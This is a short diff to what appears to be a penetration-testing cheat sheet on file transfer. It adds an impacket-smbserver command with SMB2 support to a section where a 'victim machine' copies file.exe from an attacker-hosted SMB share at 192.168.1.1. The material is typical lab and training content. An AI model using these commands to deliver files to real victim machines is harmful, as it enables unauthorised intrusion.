@@ -52,6 +52,9 @@ On attacker machine:
 On victim machine:
 > dir \\192.168.1.1\transfer
 > copy \\192.168.1.1\transfer\file.exe ./
+
+Specify SMB2 support
+> impacket-smbserver -smb2support transfer ./
 ```
 
 ###### netcat
